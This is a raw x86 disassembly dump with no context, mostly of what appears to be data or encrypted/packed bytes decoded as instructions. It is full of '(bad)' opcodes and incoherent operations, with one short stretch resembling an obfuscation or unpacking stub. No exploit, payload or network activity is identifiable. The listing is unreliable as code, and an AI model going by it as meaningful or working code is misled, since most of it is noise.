  41a93a:	mov    eax,edi
  41a93c:	jb     0x41a90d
  41a93e:	lock scas eax,DWORD PTR es:[edi]
  41a940:	cs jo  0x41a8c3
  41a943:	pop    esp
  41a944:	mov    eax,0x4659c2d3
  41a949:	or     DWORD PTR [edx-0x1a],edx
  41a94c:	mov    edx,0x2327f0a7
  41a951:	mov    edi,DWORD PTR [edi+0x2465bf9f]
  41a957:	mov    al,ds:0xfb78106c
  41a95c:	je     0x41a90a
  41a95e:	dec    ebx
  41a95f:	pop    ds
  41a960:	inc    esi
  41a961:	cmp    al,bl
  41a963:	loope  0x41a9dc
  41a965:	push   ebx
  41a966:	pop    esp
  41a967:	sti    
  41a968:	loop   0x41a995
  41a96a:	fs add al,0x64
  41a96d:	hlt    
  41a96e:	retf   
  41a96f:	scas   al,BYTE PTR es:[edi]
  41a970:	pop    eax
  41a971:	jbe    0x41a952
  41a973:	retf   0xffda
  41a976:	push   ebp
  41a977:	mov    dl,dl
  41a979:	xor    eax,0x2add623e
  41a97e:	mov    ah,0xbb
  41a980:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41a981:	push   edx
  41a982:	(bad)  
  41a983:	ret    0x43d8
  41a986:	sub    DWORD PTR [esi-0x4874363f],esi
  41a98c:	mov    dl,0x48
  41a98e:	rcr    esi,1
  41a990:	dec    ebp
  41a991:	out    0x17,eax
  41a993:	popf   
  41a994:	adc    DWORD PTR [edi+0x4a],esp
  41a997:	fs pusha 
  41a999:	es outs dx,BYTE PTR gs:[esi]
  41a99c:	jmp    0x97e6342
  41a9a1:	pop    esp
  41a9a2:	push   edx
  41a9a3:	retf   0x2bf5
  41a9a6:	ficom  DWORD PTR [edx+ebp*4+0x6ca79e0a]
  41a9ad:	jbe    0x41a9a5
  41a9af:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41a9b0:	jp     0x41a9b8
  41a9b2:	ror    DWORD PTR [ecx-0x5aff39e7],cl
  41a9b8:	mov    dl,0x8a
  41a9ba:	inc    edi
  41a9bc:	enter  0x944a,0xdf
  41a9c0:	lods   al,BYTE PTR ds:[esi]
  41a9c1:	push   ebp
  41a9c2:	mov    cl,0x81
  41a9c4:	xor    al,0xd9
  41a9c6:	mov    ds:0xb939b502,eax
  41a9cb:	push   0xfffffff8
  41a9cd:	ficomp WORD PTR [edx-0x60]
  41a9d0:	adc    dl,BYTE PTR [edi+ebp*4+0x39e84a71]
  41a9d7:	push   edi
  41a9d8:	js     0x41a9ae
  41a9da:	retf   
  41a9db:	dec    esp
  41a9dc:	out    dx,al
  41a9dd:	and    ebx,DWORD PTR [esi-0x66]
  41a9e0:	adc    BYTE PTR [ebp-0x79657c97],0x1b
  41a9e7:	sub    al,0xad
  41a9e9:	xchg   BYTE PTR [ecx+0x74c817be],bl
  41a9ef:	jg     0x41a9c9
  41a9f1:	leave  
  41a9f2:	mov    ch,0x4c
  41a9f4:	adc    cl,BYTE PTR [esi]
  41a9f6:	lahf   
  41a9f7:	or     al,0xc5
  41a9f9:	xor    esp,esi
  41a9fb:	mov    dl,0xbd
  41a9fd:	jge    0x41aa09
  41a9ff:	adc    ebp,ebp
  41aa01:	add    DWORD PTR [edi-0x56],edi
  41aa04:	add    ecx,ebx
  41aa06:	or     dh,BYTE PTR [ecx-0x73]
  41aa09:	call   0x16a3c7af
  41aa0e:	stos   BYTE PTR es:[edi],al
  41aa0f:	enter  0x66f,0x55
  41aa13:	neg    DWORD PTR [ecx-0x4c]
  41aa16:	jmp    0xd764403c
  41aa1b:	ins    BYTE PTR es:[edi],dx
  41aa1c:	mov    DWORD PTR [esi+0x41],edi
  41aa1f:	mov    dh,0x47
  41aa21:	pop    eax
  41aa22:	jnp    0x41a9c5
  41aa24:	sbb    al,BYTE PTR ds:0xa7e85018
  41aa2a:	imul   ecx,DWORD PTR [eax+ebp*4-0x723ca0b7],0xfffffffc
  41aa32:	lds    esi,FWORD PTR [edi-0x5b64b76b]
  41aa38:	add    BYTE PTR [ecx+0x58],al
  41aa3b:	inc    esi
  41aa3c:	fidivr WORD PTR [ecx]
  41aa3e:	loopne 0x41aa88
  41aa40:	jb     0x41aa42
  41aa42:	sbb    bl,al
  41aa44:	je     0x41aa21
  41aa46:	xor    DWORD PTR [eax],0xa21c181a
  41aa4c:	jmp    0x41aa38
  41aa4e:	pop    ebx
  41aa4f:	xor    edx,DWORD PTR [eax-0x6b]
  41aa52:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41aa53:	popf   
  41aa54:	jno    0x41aa6d
  41aa56:	mov    dl,0x95
  41aa58:	sub    eax,0x5ec220d0
  41aa5d:	lds    edi,FWORD PTR [eax]
  41aa5f:	push   ds
  41aa60:	xor    DWORD PTR [eax+edx*1],edx
  41aa63:	retf   0x7742
  41aa66:	cmp    BYTE PTR [edi],ah
  41aa68:	jg     0x41aaa1
  41aa6a:	and    bh,BYTE PTR [esi+0x50f8ae22]
  41aa70:	push   edx
  41aa71:	cs stos BYTE PTR es:[edi],al
  41aa73:	jge    0x41aaea
  41aa75:	pop    edi
  41aa76:	(bad)  
  41aa78:	push   cs
  41aa79:	or     BYTE PTR [edx-0x7f],ah
  41aa7c:	jbe    0x41aa02
  41aa7e:	int    0x99
  41aa80:	adc    eax,0xdc52eafb
  41aa85:	dec    esp
  41aa86:	cld    
  41aa87:	lods   eax,DWORD PTR ds:[esi]
  41aa88:	std    
  41aa89:	cmp    ch,BYTE PTR [edx-0x6a]
  41aa8c:	mov    al,0xc9
  41aa8e:	and    BYTE PTR [ebx+ebp*2-0x43],dl
  41aa92:	pop    ecx
  41aa93:	mov    ebx,0x2e40eb95
  41aa98:	out    0xdd,al
  41aa9a:	imul   ebp,esp,0x48af935c
  41aaa0:	push   eax
  41aaa1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41aaa2:	add    ch,BYTE PTR [edx+0x2737166c]
  41aaa8:	adc    ebx,DWORD PTR [eax-0x7a]
  41aaab:	cmc    
  41aaac:	popf   
  41aaad:	or     ebx,DWORD PTR [ebx-0x707e78ff]
  41aab3:	mov    WORD PTR [eax],?
  41aab5:	in     eax,dx
  41aab6:	sbb    DWORD PTR [ecx+0x6cdbbca],ecx
  41aabc:	popa   
  41aabd:	nop
  41aabe:	mov    eax,0x8312f3
  41aac3:	mov    ?,WORD PTR [ebx+0x24]
  41aac6:	outs   dx,DWORD PTR ds:[esi]
  41aac7:	adc    eax,0x8dcc3322
  41aacc:	pop    ss
  41aacd:	cld    
  41aace:	pop    edi
  41aacf:	sub    edi,DWORD PTR ds:0x322efa92
  41aad5:	ins    DWORD PTR es:[edi],dx
  41aad6:	sub    DWORD PTR [eax+0x19cfab52],ebp
  41aadc:	mov    dh,0x20
  41aade:	cmp    BYTE PTR [edx],ah
  41aae0:	iret   
  41aae1:	rcl    BYTE PTR [ebx],1
  41aae3:	jno    0x41ab1c
  41aae5:	sub    DWORD PTR ds:[eax+0x20],edi
  41aae9:	add    edx,DWORD PTR [ecx+0x279c104c]
  41aaef:	imul   ecx,eax,0x829b9ae4
  41aaf5:	loope  0x41ab38
  41aaf7:	push   0xffffff98
  41aaf9:	mov    ebp,0xc28dba36
  41aafe:	sbb    al,0x8
  41ab00:	stos   BYTE PTR es:[edi],al
  41ab01:	into   
  41ab02:	mov    ch,0xe4
  41ab04:	cmp    DWORD PTR [ebx-0x1e],edi
  41ab07:	and    BYTE PTR [ecx+0x40],dl
  41ab0a:	je     0x41ab2b
  41ab0c:	jnp    0x41aa93
  41ab0e:	enter  0x9842,0xbe
  41ab12:	scas   al,BYTE PTR es:[edi]
  41ab13:	repnz xlat BYTE PTR ds:[ebx]
  41ab15:	mov    bh,bh
  41ab17:	add    ebx,esi
  41ab19:	dec    eax
  41ab1a:	sub    eax,0x570c730b
  41ab1f:	pop    edi
  41ab20:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41ab21:	or     eax,0x1966c20
  41ab26:	stos   DWORD PTR es:[edi],eax
  41ab27:	(bad)  
  41ab28:	sub    BYTE PTR [ecx+0x48],cl
  41ab2b:	dec    edx
  41ab2c:	shr    BYTE PTR [edx+0x20],0xbf
  41ab30:	sbb    eax,0x3f4b0177
  41ab35:	xchg   edx,eax
  41ab36:	xor    edx,DWORD PTR [ebx-0x6e]
  41ab39:	dec    eax
  41ab3a:	dec    esp
  41ab3b:	inc    eax
  41ab3c:	adc    esi,edi
  41ab3e:	add    DWORD PTR [edi],esi
  41ab40:	test   dh,al
  41ab42:	xor    ah,dl
  41ab44:	(bad)
  41ab47:	sbb    edi,DWORD PTR [ecx]
  41ab49:	jbe    0x41ab35
  41ab4b:	mov    cs,ecx
  41ab4d:	call   0x2eb48121
  41ab52:	push   esp
  41ab53:	gs das 
  41ab55:	popf   
  41ab56:	cwde   
  41ab57:	sub    al,0xea
  41ab59:	push   ecx
  41ab5a:	dec    esp
  41ab5b:	ret    
  41ab5c:	iret   
  41ab5d:	in     al,0x9d
  41ab5f:	push   esp
  41ab60:	dec    ebp
  41ab61:	test   ebx,esi
  41ab63:	dec    esi
  41ab64:	enter  0x37ca,0xc8
  41ab68:	out    0xb,al
  41ab6a:	mov    ebp,0xb3993c51
  41ab6f:	call   0x9dc7:0x8ccf15c3
  41ab76:	ret    0xdff7
  41ab79:	out    dx,al
  41ab7a:	inc    esp
  41ab7b:	sbb    eax,0x65a94a46
  41ab80:	jb     0x41ab53
  41ab82:	mov    ebx,edx
  41ab84:	stos   DWORD PTR es:[edi],eax
  41ab85:	mov    al,0x3a
  41ab87:	out    dx,eax
  41ab88:	dec    edx
  41ab89:	sub    DWORD PTR [edx+0x40586f41],ebx
  41ab8f:	pop    ecx
  41ab90:	dec    ecx
  41ab91:	cmc    
  41ab92:	jbe    0x41ab94
  41ab94:	(bad)
  41ab97:	mov    ds,WORD PTR [eax]
  41ab99:	(bad)  
  41ab9b:	mov    fs,WORD PTR [eax]
  41ab9d:	add    bl,BYTE PTR [ecx-0x5b06ae0b]
  41aba3:	jo     0x41ab6f
  41aba5:	retf   
  41aba6:	xor    DWORD PTR [edi+0x1d],0xd975fc37
  41abad:	dec    esi
  41abae:	inc    edx
  41abaf:	(bad)  
  41abb0:	outs   dx,BYTE PTR ds:[esi]
  41abb1:	ror    DWORD PTR [esi],0x1c
  41abb4:	iret   
  41abb5:	call   0x9193:0x1d9284a
  41abbc:	inc    ebx
  41abbd:	adc    ch,dl
  41abbf:	out    dx,eax
  41abc0:	in     eax,dx
  41abc1:	cmc    
  41abc2:	jb     0x41ab8e
  41abc4:	int    0xfd
  41abc6:	ds mov edx,0x8dda0dd
  41abcc:	fstp   TBYTE PTR [esp+ebp*1+0x64cdf3d2]
  41abd3:	add    esi,DWORD PTR [edi]
  41abd5:	or     dh,BYTE PTR [eax+0x529057c2]
  41abdb:	pop    ss
  41abdc:	xchg   ecx,eax
  41abdd:	lods   eax,DWORD PTR ds:[esi]
  41abde:	add    edi,DWORD PTR [eax+0xd]
  41abe1:	(bad)  
  41abe2:	xchg   edi,eax
  41abe3:	lds    ebp,FWORD PTR [esi-0x1]
  41abe6:	sti    
  41abe7:	iret   
  41abe8:	dec    BYTE PTR [eax-0x623d5358]
  41abee:	add    ecx,DWORD PTR [edx+0x7f]
  41abf1:	les    ebx,FWORD PTR [esp+eax*2+0x7f]
  41abf5:	mov    ebx,0xced803f5
  41abfa:	jmp    0x41ac78
  41abfc:	push   ecx
  41abfd:	rcl    DWORD PTR [edx],cl
  41abff:	popf   
  41ac00:	loopne 0x41ac44
  41ac02:	pop    es
  41ac03:	jnp    0x41abd8
  41ac05:	push   ebx
  41ac06:	cmp    esi,DWORD PTR [edx+0x5b]
  41ac09:	in     eax,0x46
  41ac0b:	aad    0x4c
  41ac0d:	cli    
  41ac0e:	bound  esi,QWORD PTR [edx+0x36]
  41ac11:	cmp    DWORD PTR [ecx-0x29396ba7],0xfd1d55db
  41ac1b:	xor    BYTE PTR [edx-0x76badcfb],0x2f
  41ac22:	dec    ebp
  41ac23:	cmc    
  41ac24:	push   cs
  41ac25:	daa    
  41ac26:	int    0xe9
  41ac28:	jae    0x41abf9
  41ac2a:	cli    
  41ac2b:	sub    edi,DWORD PTR [ebx-0x5e940cfc]
  41ac31:	popf   
  41ac32:	dec    esp
  41ac33:	imul   edx,ecx,0x5ecdb1f6
  41ac39:	xchg   esp,eax
  41ac3a:	lock jno 0x41ac03
  41ac3d:	jmp    0xb7ee:0x53d6f57f
  41ac44:	push   eax
  41ac45:	scas   eax,DWORD PTR es:[edi]
  41ac46:	sub    ebp,DWORD PTR [ebx-0x1a71dd08]
  41ac4c:	scas   eax,DWORD PTR es:[edi]
  41ac4d:	inc    edx
  41ac4e:	iret   
  41ac4f:	hlt    
  41ac50:	and    eax,esi
  41ac52:	dec    ecx
  41ac53:	pop    ss
  41ac54:	std    
  41ac55:	mov    ebx,0x9bcc63db
  41ac5a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41ac5b:	out    0xd2,al
  41ac5d:	(bad)  
  41ac5f:	xchg   edi,eax
  41ac60:	shl    DWORD PTR [edx],1
  41ac62:	add    bl,BYTE PTR [esi+0x4d]
  41ac65:	ror    DWORD PTR [ecx-0x79a9f35f],cl
  41ac6b:	mov    ebx,0x8cc7b563
  41ac70:	pop    ss
  41ac71:	push   cs
  41ac72:	inc    ebx
  41ac73:	cmp    ecx,ecx
  41ac75:	mov    DWORD PTR [ebp-0xab04e65],ecx
  41ac7b:	mov    ebx,0xef978a7a
  41ac80:	into   
  41ac81:	and    eax,0xc242bda8
  41ac86:	push   eax
  41ac87:	or     BYTE PTR [eax],bh
  41ac89:	aad    0xde
  41ac8b:	xor    BYTE PTR [edi-0xf61c673],bl
  41ac91:	mov    edx,0x21ff
  41ac96:	add    DWORD PTR ds:0x422942,0x42b3
  41aca0:	sub    edx,eax
  41aca2:	mov    eax,ds:0x4228ea
  41aca7:	push   esi
  41aca8:	mov    eax,0xb49
  41acad:	sbb    eax,ecx
  41acaf:	cmp    DWORD PTR ds:0x422916,0x0
  41acb6:	mov    DWORD PTR ds:0x4229d2,ebx
  41acbc:	mov    DWORD PTR ds:0x42293a,ecx
  41acc2:	mov    DWORD PTR ds:0x422942,ecx
  41acc8:	jmp    0x41ad23
  41accd:	not    DWORD PTR ds:0x4228ce
  41acd3:	jge    0x41acf8
  41acd9:	push   0x7637
  41acde:	call   DWORD PTR ds:0x42a02c
  41ace4:	adc    ecx,DWORD PTR ds:0x42295a
  41acea:	xor    esi,esi
  41acec:	xor    esi,DWORD PTR ds:0x4228ea
  41acf2:	and    DWORD PTR ds:0x422952,esi
  41acf8:	sbb    DWORD PTR ds:0x422986,ebx
  41acfe:	mov    esi,DWORD PTR ds:0x422a9a
  41ad04:	mov    ecx,DWORD PTR ds:0x422afa
  41ad0a:	sub    ecx,esi
  41ad0c:	add    esi,DWORD PTR [esi+ecx*1]
  41ad0f:	xor    ecx,ecx
  41ad11:	xor    ecx,DWORD PTR ds:0x4228ae
  41ad17:	or     DWORD PTR ds:0x422896,ecx
  41ad1d:	sbb    ecx,DWORD PTR ds:0x422976
  41ad23:	mov    ecx,DWORD PTR [ebp-0x20]
  41ad26:	mov    esi,DWORD PTR [ebp-0x1c]
  41ad29:	jmp    0x41b172
  41ad2e:	test   BYTE PTR [eax+ecx*2+0x7c],ah
  41ad32:	sub    BYTE PTR [eax],ah
  41ad34:	cmp    BYTE PTR [ebp+eax*1-0x4e],dl
  41ad38:	cmc    
  41ad39:	push   0xae7cd240
  41ad3e:	int    0x1d
  41ad40:	or     al,0x16
  41ad42:	(bad)  
  41ad43:	push   cs
  41ad44:	push   ss
  41ad45:	push   ss
  41ad46:	mov    cl,0x44
  41ad48:	xchg   esi,eax
  41ad49:	aaa    
  41ad4a:	(bad)  
  41ad4b:	stos   BYTE PTR es:[edi],al
  41ad4c:	push   ecx
  41ad4d:	adc    edi,DWORD PTR [edx-0x20d15628]
  41ad53:	bound  esp,QWORD PTR [edi+0x4357bff5]
  41ad59:	std    
  41ad5a:	jns    0x41ad71
  41ad5c:	test   al,0xba
  41ad5e:	stc    
  41ad5f:	(bad)  
  41ad60:	and    esi,eax
  41ad62:	xchg   esp,eax
  41ad63:	dec    edi
  41ad64:	inc    esi
  41ad65:	adc    edi,ebx
  41ad67:	mov    eax,0xdd1415da
  41ad6c:	dec    esi
  41ad6d:	add    cl,BYTE PTR [ecx-0x54]
  41ad70:	dec    ebp
  41ad71:	and    DWORD PTR [ebx-0x52],0xffffffa3
  41ad75:	(bad)  
  41ad76:	jmp    0xb5a4:0xb7729414
  41ad7d:	jp     0x41ad06
  41ad7f:	push   esp
  41ad80:	ss clc 
  41ad82:	mov    esi,0x966ac2c7
  41ad87:	std    
  41ad88:	aas    
  41ad89:	ret    0xc8b6
  41ad8c:	mov    bh,0xb6
  41ad8e:	or     al,0x57
  41ad90:	sub    al,0xd2
  41ad92:	dec    esp
  41ad93:	xchg   edx,eax
  41ad94:	xchg   edx,eax
  41ad95:	pushf  
  41ad96:	addr16 clc 
  41ad98:	lods   al,BYTE PTR ds:[esi]
  41ad99:	push   cs
  41ad9a:	mov    dl,0x9f
  41ad9c:	push   esp
  41ad9d:	or     al,0xbd
  41ad9f:	lock pop ds
  41ada1:	or     al,BYTE PTR [ebp-0x6]
  41ada4:	push   eax
  41ada5:	cdq    
  41ada6:	je     0x41ad7c
  41ada8:	cld    
  41ada9:	pop    ebp
  41adaa:	repnz cdq 
  41adac:	mov    edx,0xb7e16ee7
  41adb1:	mov    esp,0xedb6b289
  41adb6:	sub    BYTE PTR [ecx],0xd0
  41adb9:	pop    eax
  41adba:	and    DWORD PTR [esi+0x18],edx
  41adbd:	adc    al,bh
  41adbf:	enter  0x1ad0,0xec
  41adc3:	cmp    al,BYTE PTR [ebx-0x34]
  41adc6:	scas   al,BYTE PTR es:[edi]
  41adc7:	neg    bh
  41adc9:	cmp    ch,BYTE PTR [edx+0x19]
  41adcc:	push   ebx
  41adcd:	outs   dx,BYTE PTR ds:[esi]
  41adce:	mov    gs,ebx
  41add0:	inc    esi
  41add1:	es cld 
  41add3:	mov    eax,cs
  41add5:	push   ss
  41add6:	outs   dx,DWORD PTR ds:[esi]
  41add7:	push   ds
  41add8:	mov    ebp,DWORD PTR [ecx+ebx*8-0x70]
  41addc:	dec    ebp
  41addd:	or     BYTE PTR [ebp-0x1a436ad3],al
  41ade3:	push   esi
  41ade4:	ret    
  41ade5:	sbb    al,0x45
  41ade7:	mov    bl,0xf2
  41ade9:	and    BYTE PTR [edi+0x5d9f5cf4],dh
  41adef:	mov    ss,WORD PTR ds:0x991bc829
  41adf5:	adc    dh,cl
  41adf7:	add    eax,0xeec6f4b5
  41adfc:	push   ebp
  41adfd:	cmp    DWORD PTR [ecx+0x310bdccb],edx
  41ae03:	and    bh,BYTE PTR [esp+ebx*2-0x6f]
  41ae07:	pop    eax
  41ae08:	popf   
  41ae09:	je     0x41ae88
  41ae0b:	popf   
  41ae0c:	stc    
  41ae0d:	mov    esp,0x6eb3945b
  41ae12:	mov    WORD PTR [edx],gs
  41ae14:	mov    fs,WORD PTR [ecx+0x3b]
  41ae17:	adc    eax,0x50fa16ff
  41ae1c:	add    al,0x57
  41ae1e:	js     0x41ae13
  41ae20:	xor    eax,0x7f8d6132
  41ae25:	jnp    0x41adb0
  41ae27:	call   0x35ed14b0
  41ae2c:	into   
  41ae2d:	mov    edx,0x4fa7951a
  41ae32:	pop    eax
  41ae33:	fucomp st(4)
  41ae35:	ins    DWORD PTR es:[edi],dx
  41ae36:	outs   dx,DWORD PTR ds:[esi]
  41ae37:	jp     0x41ae0b
  41ae39:	jmp    0xeb7d:0xb1d59fe7
  41ae40:	outs   dx,BYTE PTR ds:[esi]
  41ae41:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41ae42:	js     0x41adef
  41ae44:	aam    0xc8
  41ae46:	enter  0x666c,0xa9
  41ae4a:	mov    ebx,ecx
  41ae4c:	shl    DWORD PTR [edx-0x6],cl
  41ae4f:	sahf   
  41ae50:	out    dx,al
  41ae51:	jbe    0x41aeaa
  41ae53:	ret    0x5ab3
  41ae56:	push   ds
  41ae57:	sbb    al,0x43
  41ae59:	jmp    0xe40b26e4
  41ae5e:	in     eax,dx
  41ae5f:	xlat   BYTE PTR ds:[ebx]
  41ae60:	mov    ecx,0x7a0049f0
  41ae65:	xchg   esi,eax
  41ae66:	push   edi
  41ae67:	cs test bl,cl
  41ae6a:	xchg   al,dl
  41ae6c:	int3   
  41ae6d:	out    dx,eax
  41ae6e:	stc    
  41ae6f:	and    BYTE PTR [eax-0x4049832d],0x3d
  41ae76:	jge    0x41ae22
  41ae78:	push   ecx
  41ae79:	xor    DWORD PTR [ecx+0x3a2afdc3],edi
  41ae7f:	adc    BYTE PTR [eax+edi*1+0x32d38b3b],dl
  41ae86:	xor    dh,dl
  41ae88:	in     eax,dx
  41ae89:	hlt    
  41ae8a:	in     al,dx
  41ae8b:	jnp    0x41ae79
  41ae8d:	aas    
  41ae8e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41ae8f:	inc    BYTE PTR [edx]
  41ae91:	(bad)  
  41ae92:	clc    
  41ae93:	shl    BYTE PTR ds:0xa3a72dea,cl
  41ae99:	ret    
  41ae9a:	fcom   QWORD PTR [ebx]
  41ae9c:	inc    esi
  41ae9d:	adc    BYTE PTR [ebp-0x64311cf],bh
  41aea3:	push   edx
  41aea4:	into   
  41aea5:	mov    WORD PTR [ebx+0x319e2641],es
  41aeab:	int3   
  41aeac:	loop   0x41ae72
  41aeae:	les    eax,FWORD PTR [esi+0x2c]
  41aeb1:	ds dec ebp
  41aeb3:	push   eax
  41aeb4:	ret    
  41aeb5:	jl     0x41ae5f
  41aeb7:	call   0x82c2:0xb755d08f
  41aebe:	repnz sub al,0xe0
  41aec1:	mov    edx,0xe728666a
  41aec6:	loope  0x41ae5b
  41aec8:	and    BYTE PTR [ebx],0x32
  41aecb:	icebp  
  41aecc:	(bad)
  41aecf:	ret    0x93f7
  41aed2:	dec    edx
  41aed3:	and    edi,DWORD PTR [eax+0x406a4a74]
  41aed9:	sub    BYTE PTR ds:0xb572dd23,dl
  41aedf:	not    BYTE PTR ds:0x6dd20c21
  41aee5:	mov    bh,0x65
  41aee7:	push   ebx
  41aee8:	adc    BYTE PTR [ebp+0x74],bh
  41aeeb:	popa   
  41aeec:	mov    dl,0xc1
  41aeee:	rol    DWORD PTR [edi],0xbf
  41aef1:	cmc    
  41aef2:	adc    ebx,DWORD PTR [ebx]
  41aef4:	ret    0xf0fc
  41aef7:	bound  esi,QWORD PTR [eax+0x5f92528f]
  41aefd:	pop    edx
  41aeff:	fbstp  TBYTE PTR [eax-0x4683fbb0]
  41af05:	shr    BYTE PTR [ecx+0x19c84dff],cl
  41af0b:	cmp    bl,BYTE PTR [esi-0x2fcf8684]
  41af11:	dec    ebx
  41af12:	test   al,0xd
  41af14:	fs push ss
  41af16:	lahf   
  41af17:	mov    ebx,DWORD PTR [edx+0x5f2a9638]
  41af1d:	bound  eax,QWORD PTR [esi+0x62]
  41af20:	retf   
  41af21:	sbb    eax,0x48ae3a57
  41af26:	cwde   
  41af27:	jae    0x41af83
  41af29:	and    eax,0x4a081991
  41af2e:	mov    esp,0x14192632
  41af33:	mov    DWORD PTR [ebp+0x27],ebp
  41af36:	jle    0x41af17
  41af38:	sbb    al,0xa5
  41af3a:	push   ss
  41af3b:	pushf  
  41af3c:	pause  
  41af3e:	xchg   edx,eax
  41af3f:	int3   
  41af40:	cs cwde 
  41af42:	rcl    BYTE PTR [eax+0x561988c8],cl
  41af48:	mov    ah,0x64
  41af4a:	push   esp
  41af4b:	and    BYTE PTR [eax+0x1d],0x7e
  41af4f:	sbb    BYTE PTR [ecx-0x69],cl
  41af52:	leave  
  41af53:	jae    0x41af82
  41af55:	sbb    ecx,DWORD PTR [ebp+0x12411c89]
  41af5b:	in     eax,dx
  41af5c:	or     DWORD PTR ds:0xb60a3c9b,0x2d41ed3e
  41af66:	adc    BYTE PTR ds:0x992c4398,ah
  41af6c:	shl    edi,0x71
  41af6f:	in     eax,dx
  41af70:	inc    edx
  41af71:	lahf   
  41af72:	xlat   BYTE PTR ds:[ebx]
  41af73:	int3   
  41af74:	xor    bh,bl
  41af76:	add    ah,BYTE PTR [edx+0x1676c995]
  41af7c:	daa    
  41af7d:	call   0x9377:0x8f5a8858
  41af84:	jg     0x41af9f
  41af86:	xchg   DWORD PTR [ebx],esp
  41af88:	and    eax,0x2951992c
  41af8d:	inc    ebx
  41af8e:	out    dx,eax
  41af8f:	mov    ss,WORD PTR [edx-0x5226e0b6]
  41af95:	lods   eax,DWORD PTR ds:[esi]
  41af96:	jg     0x41afa2
  41af98:	push   es
  41af99:	push   0x938014a9
  41af9e:	je     0x41b01d
  41afa0:	out    dx,eax
  41afa1:	lods   al,BYTE PTR ds:[esi]
  41afa2:	dec    ebx
  41afa3:	ret    
  41afa4:	arpl   WORD PTR [edx+eax*8],bp
  41afa7:	xchg   esp,eax
  41afa8:	xchg   ebp,eax
  41afa9:	xor    al,0xe0
  41afab:	jmp    0x41af60
  41afad:	repz push 0x707a0dce
  41afb3:	mov    dh,0xb5
  41afb5:	addr16 test al,0xf2
  41afb8:	mov    bl,al
  41afba:	add    BYTE PTR [ecx+0x6eb1d75a],dl
  41afc0:	push   edi
  41afc1:	mov    al,0xf3
  41afc3:	cmp    al,BYTE PTR [ebx-0xe]
  41afc6:	imul   esi,edi,0x1d907cb9
  41afcc:	(bad)  
  41afcd:	adc    BYTE PTR [edi+eiz*4+0x5e],bl
  41afd1:	jl     0x41afa3
  41afd3:	mov    ecx,0x265eea17
  41afd8:	dec    ebx
  41afd9:	std    
  41afda:	mov    cl,0xe7
  41afdc:	xor    bl,BYTE PTR [ebx-0x5]
  41afdf:	sti    
  41afe0:	and    eax,ebx
  41afe2:	and    al,0xbe
  41afe4:	mov    BYTE PTR [eax+0x6f716072],dh
  41afea:	mov    ebp,0xbe9986c7
  41afef:	mov    ebp,0xcf80686a
  41aff4:	std    
  41aff5:	mov    dl,0x87
  41aff7:	(bad)  
  41aff9:	scas   eax,DWORD PTR es:[edi]
  41affa:	adc    esp,DWORD PTR [ebp+0x76e483e3]
  41b000:	xor    cl,BYTE PTR [esi-0x20c2bc28]
  41b006:	ja     0x41b049
  41b008:	(bad)  
  41b00a:	mov    ch,0xbe
  41b00c:	dec    ebx
  41b00d:	int    0xee
  41b00f:	sbb    eax,0x64dbe523
  41b014:	jae    0x41afb2
  41b016:	mov    dl,0xf4
  41b018:	mov    ecx,0x25ccc32
  41b01d:	loope  0x41af9f
  41b01f:	add    esp,esi
  41b021:	lods   al,BYTE PTR ds:[esi]
  41b022:	xor    eax,0xa7956494
  41b027:	and    eax,DWORD PTR [edx+0x7346b7c9]
  41b02d:	add    esp,DWORD PTR [edx+ebp*8-0x9]
  41b031:	out    dx,al
  41b032:	push   eax
  41b033:	dec    ecx
  41b034:	lock push edx
  41b036:	inc    eax
  41b037:	push   esi
  41b038:	daa    
  41b039:	lea    ebx,[edi-0x68]
  41b03c:	bound  edi,QWORD PTR [edx-0x75c289ea]
  41b042:	inc    ebx
  41b043:	(bad)  
  41b044:	ret    
  41b045:	mov    es,WORD PTR [si+0x2c]
  41b049:	dec    ebp
  41b04a:	inc    edi
  41b04b:	xchg   esp,eax
  41b04c:	js     0x41b057
  41b04e:	xchg   esp,eax
  41b04f:	xor    al,0x86
  41b051:	(bad)  
  41b052:	ffreep st(5)
  41b054:	fnstsw ax
  41b056:	(bad)  
  41b057:	imul   edx,DWORD PTR [edi+esi*1],0x8234df8f
  41b05e:	and    eax,0x5b6dd2b7
  41b063:	jg     0x41afea
  41b065:	jg     0x41b060
  41b067:	retf   0xef7b
  41b06a:	out    0x16,al
  41b06c:	push   ss
  41b06d:	pop    esp
  41b06e:	mov    al,ds:0x61cb285e
  41b073:	mov    al,ds:0x399b8665
  41b078:	call   0xffe5:0xcfa1e9e8
  41b07f:	sbb    eax,0x81681a93
  41b084:	mov    dl,0xb2
  41b086:	aas    
  41b087:	xchg   BYTE PTR [ebp+0x6c],dh
  41b08a:	and    BYTE PTR [eax+0x2702b9d2],cl
  41b090:	mov    BYTE PTR [ebx],ah
  41b092:	xchg   edx,eax
  41b093:	test   eax,eax
  41b095:	jg     0x41b079
  41b097:	jmp    0xc299:0x8f2e0772
  41b09e:	cmp    eax,ebp
  41b0a0:	mov    esi,0x576d91c9
  41b0a5:	xlat   BYTE PTR ds:[ebx]
  41b0a6:	dec    edx
  41b0a7:	jo     0x41b090
  41b0a9:	xor    BYTE PTR [ebx+esi*1],0x1a
  41b0ad:	xchg   ecx,eax
  41b0ae:	aaa    
  41b0af:	or     DWORD PTR ss:[eax+0x30],ebp
  41b0b3:	push   ds
  41b0b4:	xchg   si,ax
  41b0b6:	iret   
  41b0b7:	xor    al,0x67
  41b0b9:	xchg   esi,eax
  41b0ba:	cmp    ebp,DWORD PTR [edi]
  41b0bc:	jge    0x41b0c0
  41b0be:	outs   dx,BYTE PTR es:[esi]
  41b0c0:	dec    esi
  41b0c1:	push   ecx
  41b0c2:	(bad)  [ecx+0x449916d8]
  41b0c8:	and    esi,DWORD PTR [ebp+0x2]
  41b0cb:	fnstsw WORD PTR [ecx-0x65]
  41b0ce:	ficomp DWORD PTR [edx+0x77109f47]
  41b0d4:	int3   
  41b0d5:	(bad)  
  41b0d6:	or     al,0x5b
  41b0d8:	lods   al,BYTE PTR ds:[esi]
  41b0d9:	mov    ebp,0x769480bc
  41b0de:	and    edi,DWORD PTR [ecx-0x20]
  41b0e1:	inc    esi
  41b0e2:	setb   dl
  41b0e5:	call   eax
